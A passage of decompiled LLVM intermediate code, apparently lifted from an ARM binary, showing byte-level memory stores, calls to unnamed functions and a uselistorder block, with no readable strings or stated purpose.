  store i8 %v1_ae2c, i8* %v4_ae2c, align 1
  %v0_ae30 = load i32, i32* @r7, align 4
  %v1_ae30 = add i32 %v0_ae30, 4
  %v2_ae30 = inttoptr i32 %v1_ae30 to i8*
  %v3_ae30 = load i8, i8* %v2_ae30, align 1
  %v4_ae30 = zext i8 %v3_ae30 to i32
  store i32 %v4_ae30, i32* %r3.global-to-local, align 4
  %v1_ae34 = add i32 %v0_ae30, 5
  %v2_ae34 = inttoptr i32 %v1_ae34 to i8*
  %v3_ae34 = load i8, i8* %v2_ae34, align 1
  %v4_ae34 = zext i8 %v3_ae34 to i32
  store i32 %v0_ae30, i32* @r1, align 4
  %v4_ae3c = mul nuw nsw i32 %v4_ae34, 256
  %v5_ae3c = or i32 %v4_ae3c, %v4_ae30
  store i32 %v5_ae3c, i32* %r2.global-to-local, align 4
  %v0_ae40 = load i32, i32* @sl, align 4
  %v1_ae40 = trunc i32 %v0_ae40 to i8
  %v3_ae40 = add i32 %v0_ae30, 6
  %v4_ae40 = inttoptr i32 %v3_ae40 to i8*
  store i8 %v1_ae40, i8* %v4_ae40, align 1
  store i32 %stack_var_-156.0.ph, i32* %r3.global-to-local, align 4
  %v0_ae48 = load i32, i32* @sl, align 4
  %v1_ae48 = trunc i32 %v0_ae48 to i8
  %v2_ae48 = load i32, i32* @r7, align 4
  %v3_ae48 = add i32 %v2_ae48, 7
  %v4_ae48 = inttoptr i32 %v3_ae48 to i8*
  store i8 %v1_ae48, i8* %v4_ae48, align 1
  %v0_ae4c = load i32, i32* @r6, align 4
  store i32 %v0_ae4c, i32* %r0.global-to-local, align 4
  %v4_ae50 = call i32 @function_e480(i32 %v0_ae4c, i32 %v0_ae30, i32 %v5_ae3c, i32 %stack_var_-156.0.ph)
  %v5_ae50 = trunc i32 %v4_ae50 to i8
  store i32 %v4_ae50, i32* %r0.global-to-local, align 4
  %v3_ae54 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ae54, i32* %r3.global-to-local, align 4
  %v3_ae58 = mul i32 %v3_ae54, 32
  store i32 %v3_ae58, i32* %r2.global-to-local, align 4
  %v0_ae5c = load i32, i32* @r5, align 4
  %v1_ae5c = add i32 %v0_ae5c, 16
  %v2_ae5c = inttoptr i32 %v1_ae5c to i32*
  %v3_ae5c = load i32, i32* %v2_ae5c, align 4
  store i32 %v3_ae5c, i32* %r1.global-to-local, align 4
  %v5_ae60 = mul i32 %v3_ae54, 24
  store i32 %v5_ae60, i32* %r2.global-to-local, align 4
  %v4_ae6442 = udiv i32 %v4_ae50, 256
  %v1_ae68 = trunc i32 %v4_ae6442 to i8
  %v2_ae68 = load i32, i32* @r7, align 4
  %v3_ae68 = add i32 %v2_ae68, 7
  %v4_ae68 = inttoptr i32 %v3_ae68 to i8*
  store i8 %v1_ae68, i8* %v4_ae68, align 1
  %v0_ae6c = load i32, i32* %r2.global-to-local, align 4
  %v1_ae6c = load i32, i32* @sb, align 4
  %v2_ae6c = add i32 %v1_ae6c, %v0_ae6c
  store i32 %v2_ae6c, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_ae74 = load i32, i32* @r7, align 4
  %v4_ae74 = add i32 %v3_ae74, 6
  %v5_ae74 = inttoptr i32 %v4_ae74 to i8*
  store i8 %v5_ae50, i8* %v5_ae74, align 1
  %v0_ae78 = load i32, i32* %r1.global-to-local, align 4
  %v1_ae78 = load i32, i32* %lr.global-to-local, align 4
  %v2_ae78 = add i32 %v1_ae78, 4
  %v3_ae78 = inttoptr i32 %v2_ae78 to i32*
  store i32 %v0_ae78, i32* %v3_ae78, align 4
  %v0_ae7c = load i32, i32* %r3.global-to-local, align 4
  %v1_ae7c = trunc i32 %v0_ae7c to i8
  %v2_ae7c = load i32, i32* %r2.global-to-local, align 4
  %v3_ae7c = load i32, i32* @sb, align 4
  %v4_ae7c = add i32 %v3_ae7c, %v2_ae7c
  %v5_ae7c = inttoptr i32 %v4_ae7c to i8*
  store i8 %v1_ae7c, i8* %v5_ae7c, align 1
  %v0_ae80 = load i32, i32* @sl, align 4
  %v1_ae80 = trunc i32 %v0_ae80 to i8
  %v2_ae80 = load i32, i32* %lr.global-to-local, align 4
  %v3_ae80 = add i32 %v2_ae80, 2
  %v4_ae80 = inttoptr i32 %v3_ae80 to i8*
  store i8 %v1_ae80, i8* %v4_ae80, align 1
  %v0_ae84 = load i32, i32* @sl, align 4
  %v1_ae84 = trunc i32 %v0_ae84 to i8
  %v2_ae84 = load i32, i32* %lr.global-to-local, align 4
  %v3_ae84 = add i32 %v2_ae84, 1
  %v4_ae84 = inttoptr i32 %v3_ae84 to i8*
  store i8 %v1_ae84, i8* %v4_ae84, align 1
  %v0_ae88 = load i32, i32* @sl, align 4
  %v1_ae88 = trunc i32 %v0_ae88 to i8
  %v2_ae88 = load i32, i32* %lr.global-to-local, align 4
  %v3_ae88 = add i32 %v2_ae88, 3
  %v4_ae88 = inttoptr i32 %v3_ae88 to i8*
  store i8 %v1_ae88, i8* %v4_ae88, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ae94 = load i32, i32* @r5, align 4
  store i32 %v0_ae94, i32* %r1.global-to-local, align 4
  store i32 %v3_a9e4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-160.0.ph, i32* %r2.global-to-local, align 4
  %v0_aea0 = load i32, i32* %lr.global-to-local, align 4
  %v6_aea8 = inttoptr i32 %v0_ae94 to i32*
  %v7_aea8 = call i32 @function_13f2c(i32 %v3_a9e4, i32* %v6_aea8, i32 %stack_var_-160.0.ph, i32 16384, i32 %v0_aea0, i32 16)
  %v3_aeac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_aeac, i32* %r3.global-to-local, align 4
  %v1_aeb0 = add i32 %v3_aeac, 1
  store i32 %v1_aeb0, i32* %r0.global-to-local, align 4
  %v1_aeb4 = load i32, i32* @fp, align 4
  %v9_aeb4 = icmp eq i32 %v1_aeb0, %v1_aeb4
  store i1 %v9_aeb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aeb0, i32* %stack_var_-40, align 4
  %v6_aebc = icmp slt i32 %v1_aeb0, %v1_aeb4
  br i1 %v6_aebc, label %dec_label_pc_ad14, label %dec_label_pc_acfc

dec_label_pc_aec4:                                ; preds = %dec_label_pc_a9f4
  store i32 %v3_a9e4, i32* %r0.global-to-local, align 4
  %v1_aec8 = call i32 @function_1369c(i32 %v3_a9e4)
  store i32 %v1_aec8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aecc

dec_label_pc_aecc:                                ; preds = %dec_label_pc_a890, %dec_label_pc_aec4
  %v29_aed0 = phi i32 [ %v3_a9e4, %dec_label_pc_a890 ], [ %v1_aec8, %dec_label_pc_aec4 ]
  store i32 %v3_a890, i32* %r4.global-to-local, align 4
  store i32 %v15_a890, i32* %r8.global-to-local, align 4
  store i32 %v21_a890, i32* %sl.global-to-local, align 4
  ret i32 %v29_aed0

dec_label_pc_aed4:                                ; preds = %dec_label_pc_ad14
  %v1_aed4 = add i32 %v2_ad1c, 16
  %v2_aed4 = inttoptr i32 %v1_aed4 to i32*
  %v3_aed4 = load i32, i32* %v2_aed4, align 4
  store i32 %v3_aed4, i32* %r4.global-to-local, align 4
  %v0_aed8 = call i32 @function_fe60()
  store i32 %v0_aed8, i32* %r0.global-to-local, align 4
  %v3_aedc = load i32, i32* %stack_var_-40, align 4
  %v5_aee4 = mul i32 %v3_aedc, 24
  %v0_aee8 = load i32, i32* %r4.global-to-local, align 4
  %v1_aeec = load i32, i32* @sb, align 4
  %v2_aeec = add i32 %v1_aeec, %v5_aee4
  store i32 %v2_aeec, i32* %r1.global-to-local, align 4
  %v1_aef0 = and i32 %v0_aee8, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_aef0, i32* %r3.global-to-local, align 4
  %v1_aee8 = udiv i32 %v0_aee8, 256
  %v3_aef4 = and i32 %v1_aee8, 65280
  store i32 %v3_aef4, i32* %r2.global-to-local, align 4
  %v3_aef8 = mul i32 %v0_aee8, 16777216
  store i32 %v3_aef8, i32* %ip.global-to-local, align 4
  %v1_aefc = add i32 %v2_aeec, 20
  %v2_aefc = inttoptr i32 %v1_aefc to i8*
  %v3_aefc = load i8, i8* %v2_aefc, align 1
  %v4_aefc = zext i8 %v3_aefc to i32
  store i32 %v4_aefc, i32* %lr.global-to-local, align 4
  %v4_af00 = mul i32 %v1_aef0, 256
  %v5_af00 = or i32 %v4_af00, %v3_aef8
  store i32 %v5_af00, i32* %ip.global-to-local, align 4
  %v4_af04 = udiv i32 %v0_aee8, 16777216
  %v5_af04 = or i32 %v3_aef4, %v4_af04
  %v2_af08 = or i32 %v5_af04, %v5_af00
  %v7_af0c = lshr i32 %v0_aed8, %v4_aefc
  %v8_af0c = add i32 %v7_af0c, %v2_af08
  %v3_af18 = mul i32 %v8_af0c, 16777216
  %v1_af1c = and i32 %v8_af0c, 65280
  store i32 %v1_af1c, i32* %r0.global-to-local, align 4
  store i32 %v5_a9d0, i32* %r2.global-to-local, align 4
  %v4_af28 = mul nuw nsw i32 %v1_af1c, 256
  %v5_af28 = or i32 %v4_af28, %v3_af18
  store i32 %v5_af28, i32* %r1.global-to-local, align 4
  %v2_af2c = call i32 @llvm.bswap.i32(i32 %v8_af0c)
  store i32 %v2_af2c, i32* %r3.global-to-local, align 4
  store i1 %v7_ad44, i1* %cpsr_z.global-to-local, align 1
  %v1_af34 = load i32, i32* @r5, align 4
  %v2_af34 = add i32 %v1_af34, 16
  %v3_af34 = inttoptr i32 %v2_af34 to i32*
  store i32 %v2_af2c, i32* %v3_af34, align 4
  br i1 %v2_ad44, label %dec_label_pc_af3c, label %dec_label_pc_ad4c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_ad40
  %v0_af3c = call i32 @function_fe60()
  store i32 %v0_af3c, i32* %r0.global-to-local, align 4
  store i32 %v3_aa34, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_af4c, i1* %cpsr_z.global-to-local, align 1
  %v1_af50 = load i32, i32* @r5, align 4
  %v2_af50 = add i32 %v1_af50, 12
  %v3_af50 = inttoptr i32 %v2_af50 to i32*
  store i32 %v0_af3c, i32* %v3_af50, align 4
  br i1 %v3_af4c, label %dec_label_pc_af58, label %dec_label_pc_af3c.dec_label_pc_ad60_crit_edge

dec_label_pc_af3c.dec_label_pc_ad60_crit_edge:    ; preds = %dec_label_pc_af3c
  %v1_ad64.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad60

dec_label_pc_af58:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_ad4c
  %v0_af58 = call i32 @function_fe60()
  %v3_af60 = urem i32 %v0_af58, 65536
  store i32 %v3_af60, i32* %r0.global-to-local, align 4
  %v1_af68 = sub nsw i32 999, %v3_af60
  store i32 %v1_af68, i32* %r2.global-to-local, align 4
  %v3_af6c = sdiv i32 %v1_af68, 256
  store i32 %v3_af6c, i32* %r1.global-to-local, align 4
  %v3_af7039 = udiv i32 %v3_af60, 256
  store i32 %v3_af7039, i32* %r3.global-to-local, align 4
  %v1_af74 = trunc i32 %v3_af7039 to i8
  %v2_af74 = load i32, i32* @r5, align 4
  %v3_af74 = add i32 %v2_af74, 5
  %v4_af74 = inttoptr i32 %v3_af74 to i8*
  store i8 %v1_af74, i8* %v4_af74, align 1
  %v0_af78 = load i32, i32* %r0.global-to-local, align 4
  %v1_af78 = trunc i32 %v0_af78 to i8
  %v2_af78 = load i32, i32* @r5, align 4
  %v3_af78 = add i32 %v2_af78, 4
  %v4_af78 = inttoptr i32 %v3_af78 to i8*
  store i8 %v1_af78, i8* %v4_af78, align 1
  %v0_af7c = load i32, i32* %r1.global-to-local, align 4
  %v1_af7c = trunc i32 %v0_af7c to i8
  %v2_af7c = load i32, i32* @r6, align 4
  %v3_af7c = add i32 %v2_af7c, 5
  %v4_af7c = inttoptr i32 %v3_af7c to i8*
  store i8 %v1_af7c, i8* %v4_af7c, align 1
  store i32 %v3_aa38, i32* %r1.global-to-local, align 4
  %v1_af84 = load i32, i32* @r4, align 4
  %v9_af84 = icmp eq i32 %v3_aa38, %v1_af84
  store i1 %v9_af84, i1* %cpsr_z.global-to-local, align 1
  %v0_af88 = load i32, i32* %r2.global-to-local, align 4
  %v1_af88 = trunc i32 %v0_af88 to i8
  %v2_af88 = load i32, i32* @r6, align 4
  %v3_af88 = add i32 %v2_af88, 4
  %v4_af88 = inttoptr i32 %v3_af88 to i8*
  store i8 %v1_af88, i8* %v4_af88, align 1
  %v0_af8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_af8c, label %dec_label_pc_af90, label %dec_label_pc_af58.dec_label_pc_ad6c_crit_edge

dec_label_pc_af58.dec_label_pc_ad6c_crit_edge:    ; preds = %dec_label_pc_af58
  %v1_ad70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad6c

dec_label_pc_af90:                                ; preds = %dec_label_pc_af58, %dec_label_pc_ad60
  %v0_af90 = call i32 @function_fe60()
  %v1_af90 = trunc i32 %v0_af90 to i8
  store i32 %v0_af90, i32* %r0.global-to-local, align 4
  store i32 %v3_aa3c, i32* %r2.global-to-local, align 4
  %v4_af98 = sdiv i32 %v0_af90, 256
  store i32 %v4_af98, i32* %r3.global-to-local, align 4
  %v1_af9c = load i32, i32* @r4, align 4
  %v9_af9c = icmp eq i32 %v3_aa3c, %v1_af9c
  store i1 %v9_af9c, i1* %cpsr_z.global-to-local, align 1
  %v3_afa0 = load i32, i32* @r5, align 4
  %v4_afa0 = add i32 %v3_afa0, 58
  %v5_afa0 = inttoptr i32 %v4_afa0 to i8*
  store i8 %v1_af90, i8* %v5_afa0, align 1
  %v0_afa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_afa4 = trunc i32 %v0_afa4 to i8
  %v2_afa4 = load i32, i32* @r7, align 4
  %v3_afa4 = add i32 %v2_afa4, 1
  %v4_afa4 = inttoptr i32 %v3_afa4 to i8*
  store i8 %v1_afa4, i8* %v4_afa4, align 1
  %v0_afa8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afa8, label %dec_label_pc_afac, label %dec_label_pc_ad78

dec_label_pc_afac:                                ; preds = %dec_label_pc_af90, %dec_label_pc_ad6c
  %v0_afac = call i32 @function_fe60()
  %v1_afac = trunc i32 %v0_afac to i8
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  %v4_afb043 = udiv i32 %v0_afac, 256
  %v1_afb4 = trunc i32 %v4_afb043 to i8
  %v2_afb4 = load i32, i32* @r7, align 4
  %v3_afb4 = add i32 %v2_afb4, 3
  %v4_afb4 = inttoptr i32 %v3_afb4 to i8*
  store i8 %v1_afb4, i8* %v4_afb4, align 1
  store i32 %v1_aa2c, i32* %r3.global-to-local, align 4
  store i1 %v2_afbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afbc, label %bb108, label %bb107

bb107:                                            ; preds = %dec_label_pc_afac
  %v1_afc0 = load i32, i32* @r5, align 4
  %v2_afc0 = add i32 %v1_afc0, 16
  %v3_afc0 = inttoptr i32 %v2_afc0 to i32*
  %v4_afc0 = load i32, i32* %v3_afc0, align 4
  store i32 %v4_afc0, i32* %r3.global-to-local, align 4
  br label %bb108

bb108:                                            ; preds = %dec_label_pc_afac, %bb107
  %v3_afc4 = load i32, i32* @r7, align 4
  %v4_afc4 = add i32 %v3_afc4, 2
  %v5_afc4 = inttoptr i32 %v4_afc4 to i8*
  store i8 %v1_afac, i8* %v5_afc4, align 1
  %v0_afc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afc8, label %dec_label_pc_afd0, label %bb109

bb109:                                            ; preds = %bb108
  %v1_afc8 = load i32, i32* %r3.global-to-local, align 4
  %v2_afc8 = load i32, i32* @r6, align 4
  %v3_afc8 = add i32 %v2_afc8, 16
  %v4_afc8 = inttoptr i32 %v3_afc8 to i32*
  store i32 %v1_afc8, i32* %v4_afc8, align 4
  br label %dec_label_pc_ad8c

dec_label_pc_afd0:                                ; preds = %dec_label_pc_ad78, %bb108
  %v0_afd0 = call i32 @function_fe60()
  store i32 %v0_afd0, i32* %r0.global-to-local, align 4
  %v1_afd4 = load i32, i32* @r6, align 4
  %v2_afd4 = add i32 %v1_afd4, 16
  %v3_afd4 = inttoptr i32 %v2_afd4 to i32*
  store i32 %v0_afd0, i32* %v3_afd4, align 4
  br label %dec_label_pc_ad8c

dec_label_pc_afdc:                                ; preds = %dec_label_pc_ad8c
  %v0_afdc = load i32, i32* @r7, align 4
  %v1_afdc = add i32 %v0_afdc, 8
  store i32 %v1_afdc, i32* %r0.global-to-local, align 4
  store i32 %v5_a97c, i32* @r1, align 4
  %v1_afe4 = inttoptr i32 %v1_afdc to i8*
  %v2_afe4 = call i32 @function_1003c(i8* %v1_afe4)
  store i32 %v2_afe4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_adf0

dec_label_pc_afec:                                ; preds = %dec_label_pc_aa1c
  %v1_aff4 = add i32 %v5_a97c, 8
  store i32 %v1_aff4, i32* %r1.global-to-local, align 4
  %v1_aff8 = add i32 %v5_a97c, 66
  store i32 %v1_aff8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_acfc.preheader

; uselistorder directives
  uselistorder i32 %v1_aff8, { 1, 0 }
  uselistorder i32 %v1_aff4, { 1, 0 }
  uselistorder i32 %v0_afac, { 0, 2, 1 }
  uselistorder i32 %v0_af90, { 0, 2, 1 }
  uselistorder i32 %v3_af60, { 0, 2, 1 }
  uselistorder i32 %v2_af2c, { 1, 0 }
  uselistorder i32 %v8_af0c, { 1, 2, 0 }
  uselistorder i32 %v3_aef8, { 1, 0 }
  uselistorder i32 %v0_aee8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_aeb4, { 1, 2, 0 }
  uselistorder i32 %v1_aeb0, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_ae54, { 1, 0, 2 }
  uselistorder i32 %v4_ae50, { 0, 2, 1 }
  uselistorder i32 %v0_ae30, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_ae20, { 0, 2, 1 }
  uselistorder i32 %v4_ae04, { 1, 0 }
  uselistorder i32 %v7_ad28, { 2, 1, 0, 3 }
  uselistorder i32 %v0_acfc, { 1, 0 }
  uselistorder i1 %v7_ad44, { 2, 1, 0 }
  uselistorder i1 %v2_afbc, { 2, 3, 1, 0 }
  uselistorder i1 %v3_af4c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ac84, { 1, 0, 2 }
  uselistorder i32 %v3_ab0c, { 1, 0, 2 }
  uselistorder i32 %v3_aaec, { 1, 0 }
  uselistorder i32 %tmp91, { 1, 0 }
  uselistorder i32 %v1_aa90, { 1, 0 }
  uselistorder i32 %v1_aa8c, { 2, 1, 0 }
  uselistorder i32 %v1_aa78, { 1, 0 }
  uselistorder i32 %v1_aa74, { 2, 1, 0 }
  uselistorder i32 %v1_aa6c, { 0, 2, 1 }
  uselistorder i32 %v3_aa64, { 2, 1, 0 }
  uselistorder i32 %v0_aa40, { 1, 0, 2 }
  uselistorder i32 %v3_aa34, { 2, 1, 3, 0 }
  uselistorder i32 %v1_aa2c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v3_aa28, { 1, 0 }
  uselistorder i32 %v0_aa28, { 2, 1, 0 }
  uselistorder i32 %v0_aa20, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_aa1c, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_aa14, { 1, 0 }
  uselistorder i1 %v7_a9e8, { 1, 0 }
  uselistorder i32 %v3_a9e4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_a9d0, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_a99c, { 1, 2, 0 }
  uselistorder i32 %v5_a97c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_a930, { 1, 0 }
  uselistorder i8 %v5_a920, { 1, 0 }
  uselistorder i32 %v5_a904, { 1, 0 }
  uselistorder i32 %v6_a8c8, { 1, 0 }
  uselistorder i32 %v2_a8b0, { 0, 3, 1, 2 }
  uselistorder i32 %v1_a894, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %sl.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 46, 44, 45, 47, 26, 48, 49, 50, 51, 52, 53, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 11, 12, 14, 13, 15, 16, 18, 17, 19, 20, 22, 21, 24, 23, 0 }
  uselistorder i32* %r0.global-to-local, { 17, 1, 2, 5, 6, 3, 4, 8, 7, 9, 12, 10, 11, 13, 15, 14, 16, 33, 32, 34, 35, 36, 37, 39, 38, 43, 40, 41, 42, 46, 44, 45, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 8, 9, 10, 11, 12, 13, 3, 4, 5, 6, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 9, 10, 11 }
  uselistorder label %dec_label_pc_afd0, { 1, 0 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %dec_label_pc_aecc, { 1, 0 }
  uselistorder label %dec_label_pc_adf0, { 1, 0 }
  uselistorder label %dec_label_pc_ad8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_acfc.preheader, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
}

define i32 @function_b00c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b00c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_b00c = load i32, i32* @r4, align 4
  %v15_b00c = load i32, i32* @r8, align 4
  %v1_b010 = urem i32 %arg1, 256
  store i32 %v1_b010, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_b010, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b028 = urem i32 %arg3, 256
  store i32 %v1_b028, i32* @r4, align 4
  %v2_b02c = call i32 @function_14294(i32 %v1_b010, i32 4)
  %v0_b030 = load i32, i32* @r5, align 4
  store i32 %v0_b030, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b040 = load i32, i32* @r4, align 4
  store i32 %v0_b040, i32* %r0.global-to-local, align 4
  %v5_b044 = inttoptr i32 %v0_b030 to i32*
  %v6_b044 = call i32 @function_a4e8(i32 %v0_b040, i32* %v5_b044, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b05c = load i32, i32* @r5, align 4
  store i32 %v0_b05c, i32* %r1.global-to-local, align 4
  %v0_b060 = load i32, i32* @r4, align 4
  store i32 %v0_b060, i32* %r0.global-to-local, align 4
  %v5_b064 = trunc i32 %v6_b044 to i8
  %v6_b068 = inttoptr i32 %v0_b05c to i32*
  %v7_b068 = call i32 @function_a4e8(i32 %v0_b060, i32* %v6_b068, i32 3, i32 65535)
  %v0_b06c = load i32, i32* @r5, align 4
  store i32 %v0_b06c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b068, i32* @r7, align 4
  %v0_b07c = load i32, i32* @r4, align 4
  store i32 %v0_b07c, i32* %r0.global-to-local, align 4
  %v4_b080 = inttoptr i32 %v0_b06c to i32*
  %v5_b080 = call i32 @function_a4e8(i32 %v0_b07c, i32* %v4_b080, i32 4, i32 64)
  %v0_b08c = load i32, i32* @r5, align 4
  store i32 %v0_b08c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b098 = load i32, i32* @r4, align 4
  store i32 %v0_b098, i32* %r0.global-to-local, align 4
  %v5_b09c = trunc i32 %v5_b080 to i8
  %v6_b0a0 = inttoptr i32 %v0_b08c to i32*
  %v7_b0a0 = call i32 @function_a4e8(i32 %v0_b098, i32* %v6_b0a0, i32 5, i32 1)
  %v1_b0ac = urem i32 %v7_b0a0, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b0b8 = load i32, i32* @r5, align 4
  store i32 %v0_b0b8, i32* %r1.global-to-local, align 4
  %v0_b0bc = load i32, i32* @r4, align 4
  store i32 %v0_b0bc, i32* %r0.global-to-local, align 4
  %v5_b0c4 = inttoptr i32 %v0_b0b8 to i32*
  %v6_b0c4 = call i32 @function_a4e8(i32 %v0_b0bc, i32* %v5_b0c4, i32 6, i32 65535)
  %v0_b0cc = load i32, i32* @r5, align 4
  store i32 %v0_b0cc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b0c4, i32* @sl, align 4
  %v0_b0dc = load i32, i32* @r4, align 4
  store i32 %v0_b0dc, i32* %r0.global-to-local, align 4
  %v4_b0e0 = inttoptr i32 %v0_b0cc to i32*
  %v5_b0e0 = call i32 @function_a4e8(i32 %v0_b0dc, i32* %v4_b0e0, i32 7, i32 65535)
  %v0_b0e4 = load i32, i32* @r5, align 4
  store i32 %v0_b0e4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_b0e0, i32* @r8, align 4
  %v0_b0f4 = load i32, i32* @r4, align 4
  store i32 %v0_b0f4, i32* %r0.global-to-local, align 4
  %v4_b0f8 = inttoptr i32 %v0_b0e4 to i32*
  %v5_b0f8 = call i32 @function_a4e8(i32 %v0_b0f4, i32* %v4_b0f8, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b108 = load i32, i32* @r5, align 4
  store i32 %v0_b108, i32* %r1.global-to-local, align 4
  %v0_b10c = load i32, i32* @r4, align 4
  store i32 %v0_b10c, i32* %r0.global-to-local, align 4
  %v4_b110 = inttoptr i32 %v0_b108 to i32*
  %v5_b110 = call i32 @function_a4e8(i32 %v0_b10c, i32* %v4_b110, i32 1, i32 1)
  %v1_b118 = urem i32 %v5_b110, 256
  %v0_b11c = load i32, i32* @r5, align 4
  store i32 %v0_b11c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b128 = load i32, i32* @r4, align 4
  store i32 %v0_b128, i32* %r0.global-to-local, align 4
  %v5_b130 = inttoptr i32 %v0_b11c to i32*
  %v6_b130 = call i32 @function_a4e8(i32 %v0_b128, i32* %v5_b130, i32 19, i32 0)
  %v0_b138 = load i32, i32* @r5, align 4
  store i32 %v0_b138, i32* %r1.global-to-local, align 4
  %v2_b13c = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_b13c, i32* %r3.global-to-local, align 4
  store i32 %v6_b130, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b148 = load i32, i32* @r4, align 4
  store i32 %v0_b148, i32* %r0.global-to-local, align 4
  %v4_b14c = inttoptr i32 %v0_b138 to i32*
  %v5_b14c = call i32 @function_a4e8(i32 %v0_b148, i32* %v4_b14c, i32 25, i32 %v2_b13c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
